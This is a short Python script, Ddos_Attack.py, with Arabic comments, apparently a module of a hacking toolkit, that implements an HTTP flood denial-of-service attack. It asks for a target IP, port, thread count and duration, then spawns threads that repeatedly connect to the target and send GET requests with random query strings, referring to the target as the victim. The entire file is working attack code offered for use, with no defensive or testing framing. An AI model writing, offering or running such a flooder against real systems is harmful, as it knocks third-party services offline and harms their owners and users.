# Ddos_Attack.py

import socket
import threading
import os
import random
import time 
from utils.colors import Color, print_color

# عدد الطلبات
request_count = 0
attack_running = False

# دالة ترسل طلبات للضحيه 
def send_requests(ip, port):
    global request_count
    while attack_running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            # نرسل طلبات عشوائيه 
            payload = f"GET /?{random.randint(1, 99999)} HTTP/1.1\r\nHost: {ip}\r\n\r\n"
            s.send(payload.encode())
            request_count += 1
            s.close()
        except: 
            pass   

def start_ddos():
    global attack_running, request_count 


    # نطلب من المستخدم الاي بي والبورت
    ip = input(f"{Color.YELLOW}[?] Enter Target IP: {Color.RESET}")
    port = int(input(f"{Color.YELLOW}[?] Enter Target Port: {Color.RESET}"))
    threads_count = int(input(f"{Color.YELLOW}[?] Enter count of Threads: {Color.RESET}"))
    duration = int(input(f"{Color.YELLOW}[?] Enter duration (seconds): {Color.RESET}"))

    print_color(f"\n[+] Starting attack on {ip}:{port}...", Color.RED)
    print_color(f"[*] Threads: {threads_count} | Duration: {duration}s\n", Color.YELLOW)

    # نبدأ الهجوم
    attack_running = True 
    request_count = 0

    # نشغل الثريدات
    threads = []
    for i in range(threads_count):
        t = threading.Thread(target=send_requests, args=(ip, port))
        threads.append(t)
        t.start()
    
    # ننتظر المدة المحددة
    time.sleep(duration)
    
    # نوقف الهجوم
    attack_running = False
    
    print_color(f"\n[+] Attack finished!", Color.GREEN)
    print_color(f"[+] Total requests sent: {request_count}", Color.GREEN)